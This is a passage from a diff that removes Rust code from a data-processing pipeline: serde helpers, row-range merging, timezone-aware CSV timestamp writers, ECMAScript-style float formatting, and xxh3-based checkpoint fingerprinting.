-    fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>
-    where
-        S: serde::Serializer,
-    {
-        let encoded = self.encoded();
-        serializer.serialize_str(std::str::from_utf8(&encoded).expect("BLAKE3 digest is ASCII"))
-    }
-}
-
-impl<'de> serde::Deserialize<'de> for LineageSearchDigest {
-    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
-    where
-        D: serde::Deserializer<'de>,
-    {
-        let value = <&str>::deserialize(deserializer)?;
-        Self::parse(value).map_err(serde::de::Error::custom)
-    }
-}
-
-fn shared_lineage_text(value: &'static str) -> Arc<String> {
-    static VALUES: OnceLock<BTreeMap<&'static str, Arc<String>>> = OnceLock::new();
-    Arc::clone(
-        VALUES
-            .get_or_init(|| {
-                [
-                    "chronicle-lineage-search/v1",
-                    "selected-qualifying-stop",
-                    "no-qualifying-stop",
-                    "screen-credit-liveness-window",
-                    "pipeline-event-order",
-                    "participant-source-event-order",
-                ]
-                .into_iter()
-                .map(|text| (text, Arc::new(text.to_owned())))
-                .collect()
-            })
-            .get(value)
-            .expect("lineage text must be registered"),
-    )
-}
-
-#[derive(Clone, Debug, PartialEq, Eq)]
-struct SourceDataRows(SmallVec<[SourceDataRowRange; 2]>);
-
-impl Default for SourceDataRows {
-    fn default() -> Self {
-        Self(SmallVec::new())
-    }
-}
-
-impl serde::Serialize for SourceDataRows {
-    fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>
-    where
-        S: serde::Serializer,
-    {
-        serde::Serialize::serialize(self.0.as_slice(), serializer)
-    }
-}
-
-impl<'de> serde::Deserialize<'de> for SourceDataRows {
-    fn deserialize<D>(deserializer: D) -> Result<Self, D::Error>
-    where
-        D: serde::Deserializer<'de>,
-    {
-        struct SourceDataRowsVisitor;
-
-        impl<'de> serde::de::Visitor<'de> for SourceDataRowsVisitor {
-            type Value = SourceDataRows;
-
-            fn expecting(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
-                formatter.write_str("a sequence of source-data row ranges")
-            }
-
-            fn visit_seq<A>(self, mut sequence: A) -> Result<Self::Value, A::Error>
-            where
-                A: serde::de::SeqAccess<'de>,
-            {
-                let mut ranges = SmallVec::new();
-                while let Some(range) = sequence.next_element()? {
-                    ranges.push(range);
-                }
-                Ok(SourceDataRows(ranges))
-            }
-        }
-
-        deserializer.deserialize_seq(SourceDataRowsVisitor)
-    }
-}
-
-impl SourceDataRows {
-    fn single(row: u32) -> Self {
-        let mut rows = SmallVec::new();
-        rows.push(SourceDataRowRange {
-            first: row,
-            last: row,
-        });
-        Self(rows)
-    }
-
-    fn len(&self) -> usize {
-        self.0
-            .iter()
-            .map(|range| (range.last - range.first) as usize + 1)
-            .sum()
-    }
-
-    fn iter(&self) -> impl Iterator<Item = u32> + '_ {
-        self.0.iter().flat_map(|range| range.first..=range.last)
-    }
-
-    #[cfg(test)]
-    fn contains(&self, row: u32) -> bool {
-        self.0
-            .binary_search_by(|range| {
-                if row < range.first {
-                    std::cmp::Ordering::Greater
-                } else if row > range.last {
-                    std::cmp::Ordering::Less
-                } else {
-                    std::cmp::Ordering::Equal
-                }
-            })
-            .is_ok()
-    }
-
-    fn ranges(&self) -> &[SourceDataRowRange] {
-        &self.0
-    }
-
-    fn merge(&mut self, additional: &Self) {
-        if additional.0.is_empty() {
-            return;
-        }
-        if self.0.is_empty() {
-            self.0.clone_from(&additional.0);
-            return;
-        }
-
-        let mut merged =
-            SmallVec::<[SourceDataRowRange; 2]>::with_capacity(self.0.len() + additional.0.len());
-        let mut left = 0;
-        let mut right = 0;
-        while left < self.0.len() || right < additional.0.len() {
-            let next = if right == additional.0.len()
-                || (left < self.0.len() && self.0[left].first <= additional.0[right].first)
-            {
-                let range = self.0[left];
-                left += 1;
-                range
-            } else {
-                let range = additional.0[right];
-                right += 1;
-                range
-            };
-            if let Some(current) = merged.last_mut() {
-                if next.first <= current.last.saturating_add(1) {
-                    current.last = current.last.max(next.last);
-                    continue;
-                }
-            }
-            merged.push(next);
-        }
-        self.0 = merged;
-    }
-
-    fn cmp_expanded(&self, other: &Self) -> std::cmp::Ordering {
-        self.iter().cmp(other.iter())
-    }
-
-    #[cfg(test)]
-    fn to_vec(&self) -> Vec<u32> {
-        self.iter().collect()
-    }
-}
-
-fn empty_codebook_fields_ref() -> &'static Arc<Vec<Option<String>>> {
-    static EMPTY: OnceLock<Arc<Vec<Option<String>>>> = OnceLock::new();
-    EMPTY.get_or_init(|| Arc::new(vec![None; CODEBOOK_RENAME_PAIRS.len()]))
-}
-
-fn empty_codebook_fields() -> Arc<Vec<Option<String>>> {
-    Arc::clone(empty_codebook_fields_ref())
-}
-
-fn empty_lineage_searches() -> Arc<SmallVec<[LineageSearchEvidence; 1]>> {
-    static EMPTY: OnceLock<Arc<SmallVec<[LineageSearchEvidence; 1]>>> = OnceLock::new();
-    Arc::clone(EMPTY.get_or_init(|| Arc::new(SmallVec::new())))
-}
-
-// ---- tz formatters ------------------------------------------------------
-
-fn ts_to_local(ts_ns: i64, tz: Tz) -> DateTime<Tz> {
-    let secs = ts_ns.div_euclid(1_000_000_000);
-    let nanos = ts_ns.rem_euclid(1_000_000_000) as u32;
-    chrono::Utc
-        .timestamp_opt(secs, nanos)
-        .single()
-        .expect("valid ts")
-        .with_timezone(&tz)
-}
-
-/// Write event_timestamp matching the established CSV contract without
-/// allocating an intermediate String for every output row.
-fn emit_event_timestamp(out: &mut Vec<u8>, ts_ns: i64, tz: Tz, first: &mut bool) {
-    begin_csv_field(out, first);
-    let local = ts_to_local(ts_ns, tz);
-    write!(
-        out,
-        "{:04}-{:02}-{:02} {:02}:{:02}:{:02}{}",
-        local.year(),
-        local.month(),
-        local.day(),
-        local.hour(),
-        local.minute(),
-        local.second(),
-        local.format("%:z"),
-    )
-    .expect("writing a timestamp to Vec cannot fail");
-}
-
-fn emit_session_timestamp(out: &mut Vec<u8>, ts_ns: Option<i64>, tz: Tz, first: &mut bool) {
-    begin_csv_field(out, first);
-    let Some(ns) = ts_ns else { return };
-    let local = ts_to_local(ns, tz);
-    write!(
-        out,
-        "{:02}-{:02}-{:04} {:02}:{:02}:{:02}",
-        local.month(),
-        local.day(),
-        local.year(),
-        local.hour(),
-        local.minute(),
-        local.second(),
-    )
-    .expect("writing a timestamp to Vec cannot fail");
-}
-
-// Aggregate writers build a small row of owned fields before serializing it.
-// Keep their existing helper while the high-volume row writers emit directly.
-fn fmt_session_timestamp(ts_ns: Option<i64>, tz: Tz) -> String {
-    ts_ns
-        .map(|ns| ts_to_local(ns, tz).format("%m-%d-%Y %H:%M:%S").to_string())
-        .unwrap_or_default()
-}
-
-fn emit_screen_timestamp(out: &mut Vec<u8>, ts_ns: Option<i64>, tz: Tz, first: &mut bool) {
-    begin_csv_field(out, first);
-    let Some(ns) = ts_ns else { return };
-    let local = ts_to_local(ns, tz);
-    write!(
-        out,
-        "{:04}-{:02}-{:02} {:02}:{:02}:{:02}.000000{}",
-        local.year(),
-        local.month(),
-        local.day(),
-        local.hour(),
-        local.minute(),
-        local.second(),
-        local.format("%:z"),
-    )
-    .expect("writing a timestamp to Vec cannot fail");
-}
-
-fn emit_screen_last_activity(out: &mut Vec<u8>, ts_ns: Option<i64>, tz: Tz, first: &mut bool) {
-    begin_csv_field(out, first);
-    let Some(ns) = ts_ns else { return };
-    let local = ts_to_local(ns, tz);
-    write!(
-        out,
-        "{:04}-{:02}-{:02}T{:02}:{:02}:{:02}.000000{}",
-        local.year(),
-        local.month(),
-        local.day(),
-        local.hour(),
-        local.minute(),
-        local.second(),
-        local.format("%z"),
-    )
-    .expect("writing a timestamp to Vec cannot fail");
-}
-
-/// Consecutive rows overwhelmingly share a local calendar date, so callers
-/// that populate time columns in a loop pass one memo to avoid re-formatting
-/// the same `YYYY-MM-DD` string per row.
-#[derive(Default)]
-struct LocalDateMemo(Option<(i32, u32, u32, SharedString)>);
-
-impl LocalDateMemo {
-    fn date_string(&mut self, year: i32, month: u32, day: u32) -> SharedString {
-        match &self.0 {
-            Some((y, m, d, date)) if *y == year && *m == month && *d == day => date.clone(),
-            _ => {
-                let date = SharedString::from(format!("{year:04}-{month:02}-{day:02}"));
-                self.0 = Some((year, month, day, date.clone()));
-                date
-            }
-        }
-    }
-}
-
-fn populate_time_columns(row: &mut Row, tz: Tz, date_memo: &mut LocalDateMemo) {
-    let local = ts_to_local(row.event_timestamp_ns, tz);
-    let data = row.edit_temporal();
-    data.date = date_memo.date_string(local.year(), local.month(), local.day());
-    let day = weekday_chronicle(local.weekday());
-    data.day = day;
-    data.weekday_mf = if (2..=6).contains(&day) { 1 } else { 0 };
-    data.weekday_mth = if (2..=5).contains(&day) { 1 } else { 0 };
-    data.weekday_su_th = if day == 1 || (2..=5).contains(&day) {
-        1
-    } else {
-        0
-    };
-    data.hour = local.hour() as u8;
-    data.quarter = ((local.month() as u8 - 1) / 3) + 1;
-}
-
-// ---- float formatting (Python-like repr) -------------------------------
-
-/// Mirrors `normalizeFloatString` in browserPipeline.ts.
-/// JS `Number.toString()` algorithm = ECMAScript shortest-round-trip format.
-/// Rust f64 default Display matches IEEE 754 round-trip, but format differs
-/// for some edge cases. Use ryu_js for ECMAScript-conformant output.
-pub fn normalize_float_string(value: f64) -> String {
-    if !value.is_finite() {
-        // JS String(value) -> "NaN" | "Infinity" | "-Infinity"
-        if value.is_nan() {
-            return "NaN".to_string();
-        }
-        return if value.is_sign_positive() {
-            "Infinity".to_string()
-        } else {
-            "-Infinity".to_string()
-        };
-    }
-    let abs_value = value.abs();
-    if abs_value != 0.0 && abs_value < 1e-4 {
-        // toPrecision(15) -> parseFloat -> toExponential, then strip trailing
-        // zeros in mantissa and exponent leading zeros.
-        let p = round_to_precision(value, 15);
-        let exp_str = to_exponential(p);
-        // Replace /\.0+e/ -> "e"
-        let exp_str = collapse_zero_mantissa(&exp_str);
-        // Replace /e([+-])0+/ -> "e$1"
-        return strip_exp_leading_zeros(&exp_str);
-    }
-    // toPrecision(17) -> parseFloat -> toString(); add ".0" if no decimal/E
-    let p = round_to_precision(value, 17);
-    let normalized = js_number_to_string(p);
-    if normalized.contains('.') || normalized.contains('e') || normalized.contains('E') {
-        normalized
-    } else {
-        format!("{normalized}.0")
-    }
-}
-
-/// Render a float using `ryu_js` (the ECMAScript-conformant ryū variant).
-fn js_number_to_string(value: f64) -> String {
-    let mut buf = ryu_js::Buffer::new();
-    let s = buf.format(value);
-    // ryu_js produces JS-spec output already. But ryu_js may emit "5e0"-style
-    // for small ints — JS would emit "5". The `format` function on the
-    // Buffer is documented to match ECMAScript ToString. So we trust it.
-    s.to_string()
-}
-
-/// Round `value` to `precision` significant digits the same way JS
-/// `parseFloat(value.toPrecision(precision))` would. Implementation:
-/// render with N sig digits using ECMA spec, then parse back to f64.
-fn round_to_precision(value: f64, precision: u32) -> f64 {
-    if !value.is_finite() || value == 0.0 {
-        return value;
-    }
-    let s = ecma_to_precision(value, precision);
-    s.parse::<f64>().unwrap_or(value)
-}
-
-/// ECMAScript Number.prototype.toPrecision(precision) — string form.
-/// Spec: pick integer n with `precision` digits such that
-/// n × 10^(e-precision+1) is closest to x, ties rounded up (away from 0).
-fn ecma_to_precision(value: f64, precision: u32) -> String {
-    if value.is_nan() {
-        return "NaN".to_string();
-    }
-    if value.is_infinite() {
-        return if value.is_sign_negative() {
-            "-Infinity".to_string()
-        } else {
-            "Infinity".to_string()
-        };
-    }
-    if value == 0.0 {
-        return if precision == 0 || precision == 1 {
-            "0".to_string()
-        } else {
-            format!("0.{}", "0".repeat(precision as usize - 1))
-        };
-    }
-    // Zero and NaN are already handled, so the sign bit is the sign.
-    let neg = value.is_sign_negative();
-    let abs_v = value.abs();
-    // Render with high precision to inspect.
-    let high = format!("{:.30e}", abs_v);
-    // high looks like "5.000000000000000444089209850063e-8"
-    let (mant_part, exp_part) = match high.find('e') {
-        Some(i) => (&high[..i], &high[i + 1..]),
-        None => (high.as_str(), "0"),
-    };
-    let exp: i32 = exp_part.parse().unwrap_or(0);
-    // mant_part: "5.000000000000000444089209850063"
-    // We want `precision` significant digits from the mantissa, then the
-    // exponent stays. But we need to round at the precision-th digit.
-    // First strip the decimal point to get a digit string.
-    let mut digits = String::new();
-    for c in mant_part.chars() {
-        if c.is_ascii_digit() {
-            digits.push(c);
-        }
-    }
-    // Round digits to `precision` digits, half-away-from-zero.
-    let p = precision as usize;
-    if p >= digits.len() {
-        // Pad with zeros, no rounding needed.
-        let pad = "0".repeat(p - digits.len());
-        let rounded = format!("{digits}{pad}");
-        return precision_format_output(neg, &rounded, exp, p);
-    }
-    let kept = &digits[..p];
-    let next_digit = digits.as_bytes()[p];
-    let round_up = next_digit >= b'5';
-    let (final_digits, exp_adjust) = if !round_up {
-        (kept.to_string(), 0i32)
-    } else {
-        let bumped = increment_decimal_string(kept);
-        if bumped.len() > kept.len() {
-            // Carry propagated to a new digit; drop trailing.
-            let trimmed = &bumped[..p];
-            (trimmed.to_string(), 1i32)
-        } else {
-            (bumped, 0i32)
-        }
-    };
-    precision_format_output(neg, &final_digits, exp + exp_adjust, p)
-}
-
-/// Format the precision-rounded digit string as an ES-spec toPrecision output.
-fn precision_format_output(neg: bool, digits: &str, exp: i32, precision: usize) -> String {
-    // ES spec: if exp < -6 or exp >= precision, use exponential notation.
-    let sign = if neg { "-" } else { "" };
-    let p = precision;
-    if exp < -6 || (exp as i64) >= p as i64 {
-        // d.dddd...e±N
-        let (head, tail) = digits.split_at(1);
-        // Strip trailing zeros from tail to match parseFloat-back behavior?
-        // No — toPrecision keeps trailing zeros. parseFloat then strips them.
-        // Since we always go through parseFloat, we can keep them; parseFloat
-        // returns same f64 either way.
-        let mantissa = if tail.is_empty() {
-            head.to_string()
-        } else {
-            format!("{head}.{tail}")
-        };
-        let exp_sign = if exp >= 0 { "+" } else { "-" };
-        format!("{sign}{mantissa}e{exp_sign}{}", exp.abs())
-    } else if exp >= 0 {
-        // Integer or fixed-point with exp+1 digits before decimal.
-        let head_len = (exp as usize) + 1;
-        if head_len >= digits.len() {
-            // All digits before decimal; pad with zeros.
-            let pad = "0".repeat(head_len - digits.len());
-            format!("{sign}{digits}{pad}")
-        } else {
-            let head = &digits[..head_len];
-            let tail = &digits[head_len..];
-            format!("{sign}{head}.{tail}")
-        }
-    } else {
-        // 0.000ddd format. exp=-1 -> 0.d... ; exp=-2 -> 0.0d... etc.
-        let leading_zeros = (-exp - 1) as usize;
-        let zeros = "0".repeat(leading_zeros);
-        format!("{sign}0.{zeros}{digits}")
-    }
-}
-
-fn to_exponential(value: f64) -> String {
-    // JS Number.toExponential() with no arg: shortest round-trip in
-    // exponential form. ryu_js's Buffer::format uses scientific form when
-    // appropriate; force scientific by using format with explicit %e.
-    if value == 0.0 {
-        return "0e+0".to_string();
-    }
-    // Fall back to manual: get JS-style normalized then convert.
-    // Use ryu_js's scientific output if it picked it, else build one.
-    let mut buf = ryu_js::Buffer::new();
-    let s = buf.format(value).to_string();
-    if s.contains('e') {
-        return s;
-    }
-    // Convert plain decimal form to scientific.
-    decimal_to_exponential(&s)
-}
-
-fn decimal_to_exponential(s: &str) -> String {
-    // Parse sign
-    let (sign, rest) = if let Some(stripped) = s.strip_prefix('-') {
-        ("-", stripped)
-    } else {
-        ("", s)
-    };
-    // Split int and frac
-    let (int_part, frac_part) = if let Some((i, f)) = rest.split_once('.') {
-        (i.to_string(), f.to_string())
-    } else {
-        (rest.to_string(), String::new())
-    };
-    // Find the first non-zero digit position
-    let combined: String = format!("{int_part}{frac_part}");
-    let int_len = int_part.len();
-    let mut first_nonzero = None;
-    for (i, c) in combined.chars().enumerate() {
-        if c != '0' {
-            first_nonzero = Some(i);
-            break;
-        }
-    }
-    let Some(first_nonzero) = first_nonzero else {
-        return format!("{sign}0e+0");
-    };
-    // Exponent = (int_len - 1) - first_nonzero, whether the first significant
-    // digit sits in the integer part or past the decimal point: the "0.000ddd"
-    // form -(first_nonzero - int_len + 1) is the same expression rearranged.
-    let exp: i32 = (int_len as i32 - 1) - first_nonzero as i32;
-    // Mantissa: digit at first_nonzero, then optional ".rest"
-    let mantissa_digits: String = combined.chars().skip(first_nonzero).collect();
-    let trimmed = mantissa_digits.trim_end_matches('0');
-    let head = trimmed.chars().next().unwrap_or('0');
-    let rest_m: String = trimmed.chars().skip(1).collect();
-    let mantissa = if rest_m.is_empty() {
-        head.to_string()
-    } else {
-        format!("{head}.{rest_m}")
-    };
-    let exp_sign = if exp >= 0 { "+" } else { "-" };
-    format!("{sign}{mantissa}e{exp_sign}{}", exp.abs())
-}
-
-fn collapse_zero_mantissa(s: &str) -> String {
-    // /\.0+e/  ->  "e"
-    if let Some(idx) = s.find(".0") {
-        // Verify everything between idx+1 and the 'e' is zeros.
-        let after_dot = &s[idx + 1..];
-        if let Some(e_idx) = after_dot.find('e') {
-            let zeros = &after_dot[..e_idx];
-            if zeros.chars().all(|c| c == '0') {
-                let mut out = String::with_capacity(s.len());
-                out.push_str(&s[..idx]);
-                out.push('e');
-                out.push_str(&after_dot[e_idx + 1..]);
-                return out;
-            }
-        }
-    }
-    s.to_string()
-}
-
-fn strip_exp_leading_zeros(s: &str) -> String {
-    // /e([+-])0+/ -> "e$1"
-    if let Some(e_idx) = s.find('e') {
-        let after_e = &s[e_idx + 1..];
-        let mut chars = after_e.chars();
-        let first = chars.next();
-        if let Some(sign) = first {
-            if sign == '+' || sign == '-' {
-                let rest: String = chars.collect();
-                let stripped = rest.trim_start_matches('0');
-                let final_rest = if stripped.is_empty() { "0" } else { stripped };
-                let mut out = String::with_capacity(s.len());
-                out.push_str(&s[..e_idx]);
-                out.push('e');
-                out.push(sign);
-                out.push_str(final_rest);
-                return out;
-            }
-        }
-    }
-    s.to_string()
-}
-
-// ---- main entry ---------------------------------------------------------
-
-/// Internal Rust-side result; not directly returned across the boundary.
-#[derive(Clone, serde::Serialize, serde::Deserialize)]
-pub struct PipelineV2Result {
-    pub app_csv_bytes: Arc<Vec<u8>>,
-    pub screen_csv_bytes: Arc<Vec<u8>>,
-    pub day_coverage_csv_bytes: Arc<Vec<u8>>,
-    pub compliance_csv_bytes: Arc<Vec<u8>>,
-    pub credited_app_csv_bytes: Arc<Vec<u8>>,
-    pub review_summary_json_bytes: Arc<Vec<u8>>,
-    pub visualization_data_json_bytes: Arc<Vec<u8>>,
-    pub aggregate_csv_outputs: Arc<Vec<aggregates::AggregateCsvOutput>>,
-    pub row_lineage: Arc<Vec<PipelineRowLineage>>,
-    pub original_row_count: u32,
-    pub processed_row_count: u32,
-    pub app_row_count: u32,
-    pub screen_row_count: u32,
-    pub day_coverage_row_count: u32,
-    pub compliance_row_count: u32,
-    pub credited_app_row_count: u32,
-    pub duplicate_timestamps_corrected: u32,
-    pub exact_duplicate_rows_removed: u32,
-    pub available_timezones: Vec<String>,
-    pub timezone: String,
-    pub timezone_action: String,
-    pub rows_before_timezone_handling: u32,
-    pub rows_after_timezone_handling: u32,
-    pub rows_removed_by_timezone: u32,
-    /// Exact retained raw-row membership after timezone filtering and before
-    /// any conversion or downstream transformation.
-    pub timezone_retained_source_rows_digest: String,
-    /// Exact normalized-event state after the timezone policy has resolved its
-    /// target and populated local calendar fields, before dedupe/order.
-    pub timezone_stage_digest: String,
-    /// Product-local checkpoints for the authored physical query groups.
-    /// These are complete hashes of the state emitted by that specific stage,
-    /// not a copy of the final fused-pipeline digest. They let the incremental
-    /// scheduler stop a configuration perturbation as soon as the actual stage
-    /// value converges while retaining the fused Rust implementation.
-    pub workflow_query_group_digests: BTreeMap<String, String>,
-    /// Typed decomposition of every workflow checkpoint. The terminal digest
-    /// above commits to these exact component digests.
-    pub workflow_query_group_checkpoints: BTreeMap<String, WorkflowCheckpoint>,
-    /// Exact results at every registered physical preprocessing query.
-    pub workflow_query_digests: BTreeMap<String, String>,
-    pub workflow_query_checkpoints: BTreeMap<String, WorkflowCheckpoint>,
-}
-
-#[derive(Clone, Debug, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
-#[serde(rename_all = "camelCase")]
-pub struct WorkflowCheckpoint {
-    pub protocol_version: String,
-    pub subject_id: String,
-    pub row_membership_digest: String,
-    pub row_order_digest: String,
-    pub temporal_state_digest: String,
-    pub classification_digest: String,
-    pub payload_digest: String,
-    pub schema_digest: String,
-    pub terminal_digest: String,
-}
-
-#[derive(Clone, Debug, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
-#[serde(rename_all = "camelCase")]
-pub struct PipelineRowLineage {
-    pub output_kind: Arc<String>,
-    pub output_row_index: u32,
-    pub source_data_row_ranges: Vec<SourceDataRowRange>,
-    pub source_data_row_count: u32,
-    pub searches: Vec<LineageSearchEvidence>,
-    pub terminal_query_group: Arc<String>,
-}
-
-fn build_row_lineage(
-    output_kind: &'static str,
-    terminal_query_group: &'static str,
-    rows: &[Row],
-) -> Vec<PipelineRowLineage> {
-    build_row_lineage_from_iter(output_kind, terminal_query_group, rows.iter())
-}
-
-fn build_row_lineage_from_iter<'a>(
-    output_kind: &'static str,
-    terminal_query_group: &'static str,
-    rows: impl Iterator<Item = &'a Row>,
-) -> Vec<PipelineRowLineage> {
-    let output_kind = Arc::new(output_kind.to_owned());
-    let terminal_query_group = Arc::new(terminal_query_group.to_owned());
-    rows.enumerate()
-        .map(|(index, row)| PipelineRowLineage {
-            output_kind: Arc::clone(&output_kind),
-            output_row_index: index as u32,
-            source_data_row_ranges: row.source_data_rows.ranges().to_vec(),
-            source_data_row_count: row.source_data_rows.len() as u32,
-            searches: row.lineage_searches.iter().cloned().collect(),
-            terminal_query_group: Arc::clone(&terminal_query_group),
-        })
-        .collect()
-}
-
-trait CheckpointSink {
-    fn checkpoint_update(&mut self, bytes: &[u8]);
-}
-
-// Batch the many small row encodings into larger updates before they reach
-// the fingerprint hasher, so per-call overhead cannot dominate (measured at
-// +420 ms per WASM cold execute when 24-48 byte writes hit the hasher raw at
-// the runtime crate's opt-level 2). This is not a second hash or a cache
-// shortcut: the exact same protocol bytes reach the hasher.
-const CHECKPOINT_HASH_BUFFER_BYTES: usize = 16 * 1024;
-
-struct BufferedCheckpointHasher {
-    hasher: Xxh3,
-    pending: Vec<u8>,
-}
-
-impl BufferedCheckpointHasher {
-    fn new() -> Self {
-        Self {
-            hasher: Xxh3::new(),
-            pending: Vec::with_capacity(CHECKPOINT_HASH_BUFFER_BYTES),
-        }
-    }
-
-    #[inline]
-    fn update(&mut self, bytes: &[u8]) {
-        self.checkpoint_update(bytes);
-    }
-
-    #[inline]
-    fn flush(&mut self) {
-        if !self.pending.is_empty() {
-            self.hasher.update(&self.pending);
-            self.pending.clear();
-        }
-    }
-
-    fn finalize128(mut self) -> u128 {
-        self.flush();
-        self.hasher.digest128()
-    }
-}
-
-impl CheckpointSink for BufferedCheckpointHasher {
-    #[inline]
-    fn checkpoint_update(&mut self, bytes: &[u8]) {
-        if bytes.len() >= CHECKPOINT_HASH_BUFFER_BYTES {
-            self.flush();
-            self.hasher.update(bytes);
-            return;
-        }
-        if self.pending.len() + bytes.len() > CHECKPOINT_HASH_BUFFER_BYTES {
-            self.flush();
-        }
-        self.pending.extend_from_slice(bytes);
-    }
-}
-
-impl CheckpointSink for CheckpointHasher {
-    fn checkpoint_update(&mut self, bytes: &[u8]) {
-        self.update(bytes);
-    }
-}
-
-impl CheckpointSink for Xxh3 {
-    fn checkpoint_update(&mut self, bytes: &[u8]) {
-        self.update(bytes);
-    }
-}
-
-impl CheckpointSink for Vec<u8> {
-    fn checkpoint_update(&mut self, bytes: &[u8]) {
-        self.extend_from_slice(bytes);
-    }
-}
-
-/// Streaming serde→xxh3 sink for checkpoint value payloads. Every serde event
-/// is framed with a tag byte (plus lengths where content follows) and fed to
-/// the hasher through a small buffer, so a large step value is fingerprinted
-/// without materializing an encoded copy (the serde_json path this replaced
-/// inflated a 19 MB parse into 33.6 MB of text before hashing). Unlike
-/// postcard, this supports `collect_str` (chrono) and unknown-length
-/// sequences, and it never changes any type's persisted serialization.
-struct FingerprintSink {
-    hasher: Xxh3,
-    buffer: [u8; 4096],
-    len: usize,
-}
-
-impl FingerprintSink {
-    fn new() -> Self {
-        Self {
-            hasher: Xxh3::new(),
-            buffer: [0_u8; 4096],
-            len: 0,
-        }
-    }
-
-    fn write(&mut self, data: &[u8]) {
-        if data.len() >= self.buffer.len() {
-            self.flush();
-            self.hasher.update(data);
-        } else {
-            if self.len + data.len() > self.buffer.len() {
-                self.flush();
-            }
-            self.buffer[self.len..self.len + data.len()].copy_from_slice(data);
-            self.len += data.len();
-        }
-    }
-
-    fn tag(&mut self, tag: u8) {
-        if self.len == self.buffer.len() {
-            self.flush();
-        }
-        self.buffer[self.len] = tag;
-        self.len += 1;
-    }
-
-    fn frame(&mut self, tag: u8, data: &[u8]) {
-        self.tag(tag);
-        self.write(&(data.len() as u64).to_le_bytes());
-        self.write(data);
-    }
-
-    fn flush(&mut self) {
-        if self.len > 0 {
-            self.hasher.update(&self.buffer[..self.len]);
-            self.len = 0;
-        }
-    }
-
-    fn finish(mut self) -> u128 {
-        self.flush();
-        self.hasher.digest128()
-    }
-}
-
-#[derive(Debug)]
-struct FingerprintError(String);
-
-impl std::fmt::Display for FingerprintError {
-    fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
-        formatter.write_str(&self.0)
-    }
-}
-
-impl std::error::Error for FingerprintError {}
-
-impl serde::ser::Error for FingerprintError {
-    fn custom<T: std::fmt::Display>(message: T) -> Self {
-        Self(message.to_string())
-    }
-}
-
-struct FingerprintSerializer<'a> {
-    sink: &'a mut FingerprintSink,
-}
-
-impl FingerprintSerializer<'_> {
-    fn scalar(self, tag: u8, bytes: &[u8]) -> Result<(), FingerprintError> {
-        self.sink.tag(tag);
-        self.sink.write(bytes);
-        Ok(())
-    }
-}
-
-/// Compound serializer used for every seq/tuple/map/struct shape. Each
-/// element is preceded by a 1 marker and the compound ends with a 0 marker,
-/// so unknown-length sequences hash injectively without a length prefix.
-struct FingerprintCompound<'a> {
-    sink: &'a mut FingerprintSink,
-}
-
-impl FingerprintCompound<'_> {
-    fn element<T: serde::Serialize + ?Sized>(&mut self, value: &T) -> Result<(), FingerprintError> {
-        self.sink.tag(1);
-        value.serialize(FingerprintSerializer { sink: self.sink })
-    }
-
-    fn finish(self) -> Result<(), FingerprintError> {
-        self.sink.tag(0);
-        Ok(())
-    }
-}
-
-macro_rules! fingerprint_compound_impl {
-    ($trait:path, $serialize:ident $(, $key:ident)?) => {
-        impl $trait for FingerprintCompound<'_> {
-            type Ok = ();
-            type Error = FingerprintError;
-
-            fn $serialize<T: serde::Serialize + ?Sized>(
-                &mut self,
-                value: &T,
-            ) -> Result<(), FingerprintError> {
-                self.element(value)
-            }
-
-            $(fn $key<T: serde::Serialize + ?Sized>(
-                &mut self,
-                key: &T,
-            ) -> Result<(), FingerprintError> {
-                self.element(key)
-            })?
-
-            fn end(self) -> Result<(), FingerprintError> {
-                self.finish()
-            }
-        }
-    };
-}
-
-fingerprint_compound_impl!(serde::ser::SerializeSeq, serialize_element);
-fingerprint_compound_impl!(serde::ser::SerializeTuple, serialize_element);
-fingerprint_compound_impl!(serde::ser::SerializeTupleStruct, serialize_field);
-fingerprint_compound_impl!(serde::ser::SerializeTupleVariant, serialize_field);
-fingerprint_compound_impl!(serde::ser::SerializeMap, serialize_value, serialize_key);
-
-macro_rules! fingerprint_struct_impl {
-    ($trait:path) => {
-        impl $trait for FingerprintCompound<'_> {
-            type Ok = ();
-            type Error = FingerprintError;
-
-            fn serialize_field<T: serde::Serialize + ?Sized>(
-                &mut self,
-                key: &'static str,
-                value: &T,
-            ) -> Result<(), FingerprintError> {
-                self.sink.frame(1, key.as_bytes());
-                value.serialize(FingerprintSerializer { sink: self.sink })
-            }
-
-            fn end(self) -> Result<(), FingerprintError> {
-                self.finish()
-            }
-        }
-    };
-}
-
-fingerprint_struct_impl!(serde::ser::SerializeStruct);
-fingerprint_struct_impl!(serde::ser::SerializeStructVariant);
-
-impl<'a> serde::Serializer for FingerprintSerializer<'a> {
-    type Ok = ();
-    type Error = FingerprintError;
-    type SerializeSeq = FingerprintCompound<'a>;
-    type SerializeTuple = FingerprintCompound<'a>;
-    type SerializeTupleStruct = FingerprintCompound<'a>;
-    type SerializeTupleVariant = FingerprintCompound<'a>;
-    type SerializeMap = FingerprintCompound<'a>;
-    type SerializeStruct = FingerprintCompound<'a>;
-    type SerializeStructVariant = FingerprintCompound<'a>;
-
-    fn serialize_bool(self, value: bool) -> Result<(), FingerprintError> {
-        self.scalar(2, &[u8::from(value)])
-    }
-
-    fn serialize_i8(self, value: i8) -> Result<(), FingerprintError> {
-        self.scalar(3, &value.to_le_bytes())
-    }
-
-    fn serialize_i16(self, value: i16) -> Result<(), FingerprintError> {
-        self.scalar(4, &value.to_le_bytes())
-    }
-
-    fn serialize_i32(self, value: i32) -> Result<(), FingerprintError> {
-        self.scalar(5, &value.to_le_bytes())
-    }
-
-    fn serialize_i64(self, value: i64) -> Result<(), FingerprintError> {
-        self.scalar(6, &value.to_le_bytes())
-    }
-
-    fn serialize_i128(self, value: i128) -> Result<(), FingerprintError> {
-        self.scalar(7, &value.to_le_bytes())
-    }
-
-    fn serialize_u8(self, value: u8) -> Result<(), FingerprintError> {
-        self.scalar(8, &value.to_le_bytes())
-    }
-
-    fn serialize_u16(self, value: u16) -> Result<(), FingerprintError> {
-        self.scalar(9, &value.to_le_bytes())
-    }
-
-    fn serialize_u32(self, value: u32) -> Result<(), FingerprintError> {
-        self.scalar(10, &value.to_le_bytes())
-    }
-
-    fn serialize_u64(self, value: u64) -> Result<(), FingerprintError> {
-        self.scalar(11, &value.to_le_bytes())
-    }
-
